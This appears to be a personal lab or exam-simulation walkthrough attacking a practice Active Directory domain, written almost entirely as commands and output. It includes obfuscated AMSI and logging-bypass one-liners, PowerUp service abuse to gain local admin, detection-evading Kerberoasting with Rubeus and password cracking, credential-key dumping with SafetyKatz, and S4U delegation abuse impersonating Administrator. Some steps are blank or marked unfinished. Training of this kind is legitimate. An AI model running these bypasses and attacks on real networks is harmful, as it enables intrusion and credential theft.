```
[SNIP]

 ---------------------------------------------------------------
 SHARE DISCOVERY
 ---------------------------------------------------------------
 [*][02/20/2025 06:31] Scan Start
 [*][02/20/2025 06:31] Output Directory: C:\AD\Tools\\SmbShareHunt-02202025063120
 [*][02/20/2025 06:31] Importing computer targets from C:\AD\Tools\servers.txt
 [*][02/20/2025 06:31] 7 systems will be targeted
 [*][02/20/2025 06:31] - Skipping ping scan.
 [*][02/20/2025 06:31] Checking if TCP Port 445 is open on 7 computers
 [*][02/20/2025 06:31] - 7 computers have TCP port 445 open.
 [*][02/20/2025 06:31] Getting a list of SMB shares from 7 computers
 [*][02/20/2025 06:31] - 23 SMB shares were found.
 [*][02/20/2025 06:31] Getting share permissions from 23 SMB shares
 [*][02/20/2025 06:31] - 30 share permissions were enumerated.
 [*][02/20/2025 06:31] Identifying potentially excessive share permissions
 [*][02/20/2025 06:31] - 10 potentially excessive privileges were found on 4 shares across 3 systems.
 [*][02/20/2025 06:31] Getting directory listings from 4 SMB shares
 [*][02/20/2025 06:31] - Targeting up to 3 nested directory levels
 [*][02/20/2025 06:31] - 6 files and folders were enumerated.
 [*][02/20/2025 06:31] Scan Complete

[SNIP]
 
 [*][02/20/2025 06:31] Creating ShareGraph nodes and edges...
 [*][02/20/2025 06:31] Analysis Complete
 ---------------------------------------------------------------
 SHARE REPORT SUMMARY📌
 ---------------------------------------------------------------
 [*][02/20/2025 06:31] Domain: SmbHunt
 [*][02/20/2025 06:31] Start time: 02/20/2025 06:31:20
 [*][02/20/2025 06:31] End time: 02/20/2025 06:31:45
 [*][02/20/2025 06:31] Run time: 00:00:25.1958136
 [*][02/20/2025 06:31]
 [*][02/20/2025 06:31] COMPUTER SUMMARY
 [*][02/20/2025 06:31] - 7 domain computers found.
 [*][02/20/2025 06:31] - 0 (0.00%) domain computers responded to ping. (No Ping)
 [*][02/20/2025 06:31] - 7 (100.00%) domain computers had TCP port 445 accessible.
 [*][02/20/2025 06:31] - 3 (42.86%) domain computers had shares that were non-default.
 [*][02/20/2025 06:31] - 3 (42.86%) domain computers had shares with potentially excessive privileges.
 [*][02/20/2025 06:31] - 3 (42.86%) domain computers had shares that allowed READ access.
 [*][02/20/2025 06:31] - 2 (28.57%) domain computers had shares that allowed WRITE access.
 [*][02/20/2025 06:31] - 1 (14.29%) domain computers had shares that are HIGH RISK.
 [*][02/20/2025 06:31]
 [*][02/20/2025 06:31] SHARE SUMMARY
 [*][02/20/2025 06:31] - 23 shares were found. We expect a minimum of 14 shares
 [*][02/20/2025 06:31]   because 7 systems had open ports and there are typically two default shares.
 [*][02/20/2025 06:31] - 4 (17.39%) shares across 3 systems were non-default.
 [*][02/20/2025 06:31] - 4 (17.39%) shares across 3 systems are configured with 10 potentially excessive ACLs.
 [*][02/20/2025 06:31] - 4 (17.39%) shares across 3 systems allowed READ access.
 [*][02/20/2025 06:31] - 2 (8.70%) shares across 2 systems allowed WRITE access.
 [*][02/20/2025 06:31] - 2 (8.70%) shares across 1 systems are considered HIGH RISK.
 [*][02/20/2025 06:31]
 [*][02/20/2025 06:31] SHARE ACL SUMMARY
 [*][02/20/2025 06:31] - 30 ACLs were found.
 [*][02/20/2025 06:31] - 30 (100.00%) ACLs were associated with non-default shares.
 [*][02/20/2025 06:31] - 10 (33.33%) ACLs were found to be potentially excessive.
 [*][02/20/2025 06:31] - 6 (20.00%) ACLs were found that allowed READ access.
 [*][02/20/2025 06:31] - 2 (6.67%) ACLs were found that allowed WRITE access.
 [*][02/20/2025 06:31] - 5 (16.67%) ACLs were found that are associated with HIGH RISK share names.
 [*][02/20/2025 06:31]
 [*][02/20/2025 06:31] - The most common share names are:
 [*][02/20/2025 06:31] - 4 of 4 (100.00%) discovered shares are associated with the top 200 share names.
 [*][02/20/2025 06:31]   - 1 AI📁
 [*][02/20/2025 06:31]   - 1 studentshareadmin
 [*][02/20/2025 06:31]   - 1 C$
 [*][02/20/2025 06:31]   - 1 ADMIN$
 [*] -----------------------------------------------
 [*][02/20/2025 06:31]   - Generating HTML Report
 [*][02/20/2025 06:31]   - Estimated generation time: 1 minute or less
 [*][02/20/2025 06:31]   - All files written to C:\AD\Tools\\SmbShareHunt-02202025063120📌
 [*][02/20/2025 06:31]   - Done.
```

`Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt`:
```
[SNIP]

 ---------------------------------------------------------------
 |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
 ---------------------------------------------------------------
 SHARE DISCOVERY
 ---------------------------------------------------------------
 [*][03/11/2025 03:05] Scan Start
 [*][03/11/2025 03:05] Output Directory: C:\AD\Tools\\SmbShareHunt-03112025030549
 [*][03/11/2025 03:05] Importing computer targets from C:\AD\Tools\servers.txt
 [*][03/11/2025 03:05] 4 systems will be targeted
 [*][03/11/2025 03:05] - Skipping ping scan.
 [*][03/11/2025 03:05] Checking if TCP Port 445 is open on 4 computers
 [*][03/11/2025 03:05] - 4 computers have TCP port 445 open.
 [*][03/11/2025 03:05] Getting a list of SMB shares from 4 computers
ComputerName : mgmtsrv.tech.finance.corp
IpAddress    : 172.16.5.156

ShareName    : C$
ComputerName : dbserver31.tech.finance.corp
ShareDesc    : Default share
IpAddress    : 172.16.6.31
Sharetype    : 2147483648
ShareName    : ADMIN$
ShareAccess  : No

ShareDesc    : Remote Admin
Sharetype    : 2147483648
ShareAccess  : No
ComputerName : mgmtsrv.tech.finance.corp

IpAddress    : 172.16.5.156
ComputerName : dbserver31.tech.finance.corp
ShareName    : IPC$
IpAddress    : 172.16.6.31
ShareDesc    : Remote IPC
ShareName    : C$
Sharetype    : 2147483651
ShareDesc    : Default share
ShareAccess  : No
Sharetype    : 2147483648
ShareAccess  : No


ComputerName : dbserver31.tech.finance.corp
No credentials found.
select : Property "OperatingSystem" cannot be found.
At C:\AD\Tools\PowerHuntShares.psm1:2265 char:92
+ ... ComputerName | select OperatingSystem -ExpandProperty OperatingSystem
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (@{ComputerName=studvm.tech.finance.corp}:PSObject) [Select-Object], PSArgumentException
    + FullyQualifiedErrorId : ExpandPropertyNotFound,Microsoft.PowerShell.Commands.SelectObjectCommand
```
❌

`dir C:\AD\Tools\SmbShareHunt-02202025063120`:
```
    Directory: C:\AD\Tools\SmbShareHunt-02202025063120


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/20/2025   6:31 AM                Results
-a----         2/20/2025   6:31 AM        1069450 Summary-Report-SmbHunt.html📌
```

**Domain Enumeration | Local Admin Access**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`

`Find-PSRemotingLocalAdminAccess`:
```
```
❌

**Domain Enumeration | Session Hunting with Invoke-SessionHunter**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\Invoke-SessionHunter.ps1`

`type C:\AD\Tools\servers.txt`:
```
studvm.tech.finance.corp
mgmtsrv.tech.finance.corp
techsrv30.tech.finance.corp
dbserver31.tech.finance.corp
```

`Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access`:
```
[+] Elapsed time: 0:0:3.188

HostName     UserSession          Access
--------     -----------          ------
dbserver31🖥️ TECH\sqlserversync👤  False
mgmtsrv🖥️    TECH\techservice👤    False
```

**Domain Enumeration | Session Hunting with PowerView**

???

![Run as administrator](learning_objectives_run_as_administrator.png)

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat`:
```
[SNIP]
```

`type C:\AD\Tools\sbloggingbypass.txt`:
```powershell
[Reflection.Assembly]::"l`o`AdwIThPa`Rti`AlnamE"(('S'+'ystem'+'.C'+'ore'))."g`E`TTYPE"(('Sys'+'tem.Di'+'agno'+'stics.Event'+'i'+'ng.EventProv'+'i'+'der'))."gET`FI`eLd"(('m'+'_'+'enabled'),('NonP'+'ubl'+'ic'+',Instance'))."seTVa`l`Ue"([Ref]."a`sSem`BlY"."gE`T`TyPE"(('Sys'+'tem'+'.Mana'+'ge'+'ment.Aut'+'o'+'mation.Tracing.'+'PSEtwLo'+'g'+'Pro'+'vi'+'der'))."gEtFIe`Ld"(('e'+'tw'+'Provid'+'er'),('N'+'o'+'nPu'+'b'+'lic,Static'))."gE`Tva`lUe"($null),0)
```

`iex (type C:\AD\Tools\sbloggingbypass.txt)`

`type C:\AD\Tools\amsibypass.txt`:
```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

`iex (type C:\AD\Tools\amsibypass.txt)`

`Import-Module C:\AD\Tools\PowerView.ps1`

`Find-DomainUserLocation`:
```
UserDomain      : DCORP-STD422🖥️
UserName        : Administrator👤
ComputerName    : dcorp-std422.dollarcorp.moneycorp.local
IPAddress       : 172.16.100.22
SessionFrom     :
SessionFromName :
LocalAdmin      :
```

---

### Local Privilege Escalation

#### Local Privilege Escalation | Feature Abuse (with PowerUp, winPEAS, PrivEscCheck)

**Local Privilege Escalation | PowerUp**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerUp.ps1`

`Invoke-AllChecks`:
```
[SNIP]

ServiceName                     : gupdate📌
Path                            : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : AppendData/AddSubdirectory
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem📌
AbuseFunction                   : Install-ServiceBinary -Name 'gupdate'
CanRestart                      : False❌
Name                            : gupdate
Check                           : Modifiable Service Files

[SNIP]

ServiceName   : vds📌
Path          : C:\Windows\System32\vds.exe
StartName     : LocalSystem📌
AbuseFunction : Invoke-ServiceAbuse -Name 'vds'
CanRestart    : True📌
Name          : vds
Check         : Modifiable Services

[SNIP]
```

`Invoke-ServiceAbuse -Name 'vds' -UserName 'tech\studentuser' -Verbose`:
```
VERBOSE: Service 'vds' original path: 'C:\Windows\System32\vds.exe'
VERBOSE: Service 'vds' original state: 'Running'
VERBOSE: Executing command 'net localgroup Administrators tech\studentuser /add'
VERBOSE: binPath for vds successfully set to 'net localgroup Administrators tech\studentuser /add'⏫
VERBOSE: Restoring original path to service 'vds'
VERBOSE: binPath for vds successfully set to 'C:\Windows\System32\vds.exe'
VERBOSE: Restarting 'vds'

ServiceAbused Command
------------- -------
vds           net localgroup Administrators tech\studentuser /add⏫
```

![Run as administrator](learning_objectives_run_as_administrator.png)

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
tech\studentuser👤
```

`hostname`:
```
studvm🖥️
```

`whoami /groups`:
```
GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators👥                   Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner✅
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```
🚩

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`Get-Content C:\AD\Tools\servers.txt | % { Test-NetConnection $_ -Port 8080 }`:
```
ComputerName           : studvm.tech.finance.corp
RemoteAddress          : fe80::dca5:8ad4:c3fa:8934%4
RemotePort             : 8080
InterfaceAlias         : Ethernet
SourceAddress          : fe80::dca5:8ad4:c3fa:8934%4
PingSucceeded          : True
PingReplyDetails (RTT) : 0 ms
TcpTestSucceeded       : False

ComputerName     : mgmtsrv.tech.finance.corp🖥️
RemoteAddress    : 172.16.5.156🌐
RemotePort       : 8080
InterfaceAlias   : Ethernet
SourceAddress    : 172.16.100.1
TcpTestSucceeded : True📌

ComputerName     : techsrv30.tech.finance.corp🖥️
RemoteAddress    : 172.16.6.30🌐
RemotePort       : 8080
InterfaceAlias   : Ethernet
SourceAddress    : 172.16.100.1
TcpTestSucceeded : True📌

WARNING: TCP connect to (172.16.6.31 : 8080) failed
ComputerName           : dbserver31.tech.finance.corp
RemoteAddress          : 172.16.6.31
RemotePort             : 8080
InterfaceAlias         : Ethernet
SourceAddress          : 172.16.100.1
PingSucceeded          : True
PingReplyDetails (RTT) : 2 ms
TcpTestSucceeded       : False
```

| Computer                      | IP Address               | Port 8080 Open?            |
|--------------------------------|--------------------------|----------------------------|
| mgmtsrv.tech.finance.corp     | 172.16.5.156🌐          | ✅ Yes                     |
| techsrv30.tech.finance.corp   | 172.16.6.30🌐           | ✅ Yes                     |
| dbserver31.tech.finance.corp  | 172.16.6.31             | ❌ No (TCP Test Failed) |

`nmap -iL C:\AD\Tools\servers.txt -p 80,443,8080,8000 --open`:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-11 07:41 Pacific Daylight Time
Nmap scan report for mgmtsrv.tech.finance.corp (172.16.5.156)
Host is up (0.0030s latency).
Not shown: 3 closed tcp ports (reset)
PORT     STATE SERVICE
8080/tcp open  http-proxy🌐

Nmap scan report for techsrv30.tech.finance.corp (172.16.6.30)
Host is up (0.0030s latency).
Not shown: 3 closed tcp ports (reset)
PORT     STATE SERVICE
8080/tcp open  http-proxy🌐

Nmap done: 4 IP addresses (4 hosts up) scanned in 26.21 seconds
```

`nmap -sSV 172.16.5.156 172.16.6.30 -p8080`:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-11 07:44 Pacific Daylight Time
Nmap scan report for 172.16.5.156
Host is up (0.0020s latency).

PORT     STATE SERVICE    VERSION
8080/tcp open  tcpwrapped🌐

Nmap scan report for 172.16.6.30
Host is up (0.0019s latency).

PORT     STATE SERVICE    VERSION
8080/tcp open  tcpwrapped🌐

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 19.58 seconds
```

``:
```

```

``:
```

```

``:
```

```

---

### Domain Privilege Escalation

#### Domain Privilege Escalation | Kerberoasting (with PowerView, Rubeus, John)

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainUser -SPN`:
```
[SNIP]

logoncount            : 8
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
objectclass           : {top, person, organizationalPerson, user}
displayname           : sqlserver sync
lastlogontimestamp    : 2/4/2022 5:36:37 AM
userprincipalname     : sqlserversync
samaccountname        : sqlserversync👤
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 2/6/2022 7:47:34 AM
instancetype          : 4
usncreated            : 26345
objectguid            : 49050a8e-94f9-4ef3-9fdb-fc488cddf552
sn                    : sync
lastlogoff            : 12/31/1600 4:00:00 PM
whencreated           : 2/4/2022 1:16:06 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata : {2/4/2022 1:16:34 PM, 2/4/2022 1:16:06 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname📌: MSSQLSvc/dbserver31.tech.finance.corp📌
givenname             : sqlserver
usnchanged            : 37100
lastlogon             : 2/5/2022 11:48:16 PM
badpwdcount           : 0
cn                    : sqlserver sync
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
objectsid             : S-1-5-21-1325336202-3661212667-302732393-1111
primarygroupid        : 513
pwdlastset            : 2/5/2022 6:16:18 AM
name                  : sqlserver sync

[SNIP]
```

![BloodHound Legacy | Analysis - List all Kerberoastable Accounts](crtp_exam_simulation_bloodhound_list_all_kerberoastable_accounts.png)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:sqlserversync /simple /rc4opsec /outfile:C:\AD\Tools\krb5tgs_hashes.txt`:
```
```
❌

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`cmd /c 'C:\AD\Tools\ArgSplit.bat'`:
```
[!] Argument Limit: 180 characters
[+] Enter a string: kerberoast📌
set "z=t"
set "y=s"
set "x=a"
set "w=o"
set "v=r"
set "u=e"
set "t=b"
set "s=r"
set "r=e"
set "q=k"
set "Pwn=%q%%r%%s%%t%%u%%v%%w%%x%%y%%z%"
```

```powershell
$z="t";$y="s";$x="a";$w="o";$v="r";$u="e";$t="b";$s="r";$r="e";$q="k";$Pwn="$q$r$s$t$u$v$w$x$y$z"
```

`echo $Pwn`:
```
kerberoast
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args $Pwn /user:sqlserversync /simple /rc4opsec /outfile:C:\AD\Tools\krb5tgs_hashes.txt`:
```
[*] Action: Kerberoasting📌

[*] Using 'tgtdeleg' to request a TGT for the current user
[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
[*] Target User            : sqlserversync👤
[*] Target Domain          : tech.finance.corp
[+] Ticket successfully imported!
[*] Searching for accounts that only support RC4_HMAC, no AES
[*] Searching path 'LDAP://tech-dc.tech.finance.corp/DC=tech,DC=finance,DC=corp' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=sqlserversync)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'

[*] Total kerberoastable users : 1

[*] Hash written to C:\AD\Tools\krb5tgs_hashes.txt

[*] Roasted hashes written to : C:\AD\Tools\krb5tgs_hashes.txt📌
```

`Get-DomainUser -SPN | % {Invoke-Kerberoast -Identity $_.samaccountname}`:
```
SamAccountName       : sqlserversync
DistinguishedName    : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
ServicePrincipalName : MSSQLSvc/dbserver31.tech.finance.corp
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sqlserversync$tech.finance.corp$MSSQLSvc/dbserver31.tech.finance.corp*$E149345BAB64831EC028269E3F223675$8227DBD5D1EF86C63D7C612E2060BFC72EF3423713033D0BD5C9C7FD24423C892EB59E25B861E0E270726C87819C9CA6267962C1BD84793F8E72820D9C5017475A08

[...]
```

`Get-DomainUser -SPN | ForEach-Object { Invoke-Kerberoast -Identity $_.samaccountname } | Select-String '\$krb5tgs' | ForEach-Object { ($_ -replace '.*(\$krb5tgs.*)', '$1' -replace '}$', '').Trim() } | Out-File C:\AD\Tools\krb5tgs_hashes.txt`

`Get-NetUser -SPN | ForEach-Object {Invoke-Kerberoast -Identity $_.samaccountname} | Out-File C:\AD\Tools\krb5tgs_hashes.txt`

`type C:\AD\Tools\krb5tgs_hashes.txt`:
```
$krb5tgs$23$*sqlserversync$tech.finance.corp$MSSQLSvc/dbserver31.tech.finance.corp*$E149345BAB64831EC028269E3F223675$8227DBD5D1EF86C63D7C612E2060BFC72EF3423713033D0BD5C9C7FD24423C892EB59E25B861E0E270726C87819C9CA6267962C1BD84793F8E72820D9C5017475A0800EC037EE00D19A1158E293A9D4D0C813206CA107300BC47239BF0E70C5E8A462565DD59A2A8E12FCA7

[...]
```

![kali | attacker](https://custom-icon-badges.demolab.com/badge/kali-attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`john --format=krb5tgs --wordlist=./10k-worst-pass.txt ./krb5tgs_hashes.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2025-03-11 08:42) 0g/s 1000Kp/s 1000Kc/s 1000KC/s fffff1..eyphed
Session completed. 
```
❌

`john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt ./krb5tgs_hashes.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:11 DONE (2025-03-11 08:34) 0g/s 1245Kp/s 1245Kc/s 1245KC/s  0841079575..*7¡Vamos!
Session completed.
```
❌

`john --format=krb5tgs --wordlist=/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt ./krb5tgs_hashes.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:04 DONE (2025-03-11 08:35) 0g/s 1265Kp/s 1265Kc/s 1265KC/s !Music11..!!!!!!55
Session completed.
```
❌

#### Domain Privilege Escalation | Constrained Delegation + DCSync (with PowerView, Rubeus, SafetyKatz)

- **Find a Target User where Constrained Delegation is Enabled**

**Constrained Delegation - Users**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainUser -TrustedToAuth`:
```
```
❌

- **Find a Target Server where Constrained Delegation is Enabled**

**Constrained Delegation - Computers**

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
```
[SNIP]
```

`Import-Module C:\AD\Tools\PowerView.ps1`

`Get-DomainComputer -TrustedToAuth`:
```
[SNIP]

pwdlastset                    : 3/11/2025 7:10:31 AM
logoncount                    : 53
badpasswordtime               : 2/4/2022 2:55:13 AM
distinguishedname             : CN=STUDVM,CN=Computers,DC=tech,DC=finance,DC=corp
objectclass                   : {top, person, organizationalPerson, user...}
lastlogontimestamp            : 3/11/2025 6:57:17 AM
whencreated                   : 2/2/2022 7:13:14 AM
samaccountname                : STUDVM$🖥️
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT📌
whenchanged                   : 3/11/2025 2:10:31 PM
accountexpires                : NEVER
countrycode                   : 0
operatingsystem               : Windows Server 2019 Standard
instancetype                  : 4
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION📌
objectguid                    : 321b38f3-2d61-4b7d-b3f0-9d8b8c94b266
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 4:00:00 PM
msds-allowedtodelegateto📌    : {CIFS📌/mgmtsrv🖥️.tech.finance.corp, CIFS/mgmtsrv}
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata         : {2/4/2022 1:16:34 PM, 1/1/1601 12:00:01 AM}
serviceprincipalname          : {TERMSRV/STUDVM, TERMSRV/studvm.tech.finance.corp, WSMAN/studvm, WSMAN/studvm.tech.finance.corp...}
usncreated                    : 12921
usnchanged                    : 65667
lastlogon                     : 3/11/2025 8:52:57 AM
badpwdcount                   : 0
cn                            : STUDVM
msds-supportedencryptiontypes : 28
objectsid                     : S-1-5-21-1325336202-3661212667-302732393-1104
primarygroupid                : 515
iscriticalsystemobject        : False
name                          : STUDVM
dnshostname                   : studvm.tech.finance.corp

[SNIP]
```

- **Extract Student Machine TGS Encryption Key Hash**

![Run as administrator](learning_objectives_run_as_administrator.png)

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"`:
```
[SNIP]

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : STUDVM$🖥️
Domain            : TECH
Logon Server      : (null)
Logon Time        : 3/11/2025 5:54:44 AM
SID               : S-1-5-18

         * Username : studvm$
         * Domain   : TECH.FINANCE.CORP
         * Password : 10 8b c6 de dc 62 e8 c7 98 35 52 d0 87 32 9c c4 35 6e f8 8b e4 33 50 a7 12 68 43 02 13 6a bb 4a 74 e3 b6 2c 1e db ad 93 61 18 17 08 09 89 c1 64 30 fa 85 3b 50 76 2b df 9b 11 d8 20 4f 23 a2 c4 17 db 43 62 54 c2 0b 0e d9 72 b0 de 2e 9f dd e9 96 63 4f 09 12 84 77 f6 0e 6c 13 86 93 54 8c 77 b2 5d ec b3 7a bb 99 3b 2e 06 b9 00 39 44 d4 c7 3b 09 2d 7a 7d 1c 01 26 bf cd 22 45 43 5a 3d b5 58 95 fe f1 4f 38 c6 86 48 eb 44 86 cc bd 43 ce 82 b1 4e 7b a2 fd 09 fb 87 d4 10 f6 47 0e c0 b3 b1 2b 4a f6 e7 32 c4 03 8a fb 58 25 8a 40 46 8e e1 bc f8 8d 0f f8 a3 fa 12 1f 0d c0 58 f8 88 88 53 bf 1e a1 4d 29 de d0 b4 96 87 de 64 02 d4 92 8f c3 e4 36 f3 93 b1 38 2e 68 6f 4b 1d fb 9e 2f 10 9c 72 22 8d a6 5b d8 4d df 7a d6 f1 06 9f 4c
         * Key List :
           aes256_hmac       7f2a3239887475600fcc8595732fa9fd9756a3042254baba6c7600560a1c5eb6🔑
           rc4_hmac_nt       e5c5fa4934a2a058fb61bf3a143d4050
           rc4_hmac_old      e5c5fa4934a2a058fb61bf3a143d4050
           rc4_md4           e5c5fa4934a2a058fb61bf3a143d4050
           rc4_hmac_nt_exp   e5c5fa4934a2a058fb61bf3a143d4050
           rc4_hmac_old_exp  e5c5fa4934a2a058fb61bf3a143d4050

[SNIP]
```

- **Forge an S4U TGS using the Student Machine TGS Encryption Key Hash for Privilege Escalation**
  ???

- **Forge an S4U TGS using the Target Server TGS Encryption Key Hash for the Delegated Service and Leverage it to Obtain an Alternate TGS for the LDAP Service**

![Run as administrator](learning_objectives_run_as_administrator.png)

![studvm | studentuser](https://custom-icon-badges.demolab.com/badge/studvm-studentuser-64b5f6?logo=windows11&logoColor=white)

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:studvm$ /aes256:7f2a3239887475600fcc8595732fa9fd9756a3042254baba6c7600560a1c5eb6 /impersonateuser:Administrator /msdsspn:CIFS/mgmtsrv.tech.finance.corp /altservice:http /ptt`:
```
[SNIP]

[*] Action: S4U📌

[*] Using aes256_cts_hmac_sha1 hash: 7f2a3239887475600fcc8595732fa9fd9756a3042254baba6c7600560a1c5eb6
[*] Building AS-REQ (w/ preauth) for: 'tech.finance.corp\studvm$'
[*] Using domain controller: 172.16.4.1:88
[+] TGT request successful!📌
[*] base64(ticket.kirbi):

[SNIP]

[*] Action: S4U📌

[*] Building S4U2self request for: 'studvm$@TECH.FINANCE.CORP'
[*] Using domain controller: tech-dc.tech.finance.corp (172.16.4.1)
[*] Sending S4U2self request to 172.16.4.1:88
[+] S4U2self success!
[*] Got a TGS for 'Administrator'🎭 to 'studvm$🖥️@TECH.FINANCE.CORP'🏛️
[*] base64(ticket.kirbi):

[SNIP]

